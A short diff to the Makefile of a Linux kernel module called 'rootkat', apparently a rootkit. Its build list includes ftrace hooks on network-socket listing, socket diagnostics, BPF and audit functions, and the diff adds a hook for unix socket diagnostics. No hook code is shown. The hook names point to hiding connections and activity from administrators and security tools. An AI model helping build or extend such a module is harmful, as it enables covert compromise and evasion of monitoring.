@@ -10,7 +10,7 @@ rootkat-y := main.o kallsyms.o resolver.o ftrace_hook.o \
              hook_tcp4_seq_show.o hook_tcp6_seq_show.o \
              hook_udp_seq_show.o \
              hook_inet_sk_diag_fill.o hook_sys_bpf.o \
-             hook_audit.o hook_unix_seq_show.o
+             hook_audit.o hook_unix_seq_show.o hook_unix_diag.o
 
 # Inside the build container, $(uname -r) returns the host kernel which has
 # no headers tree. Resolve KDIR from the headers package layout instead.
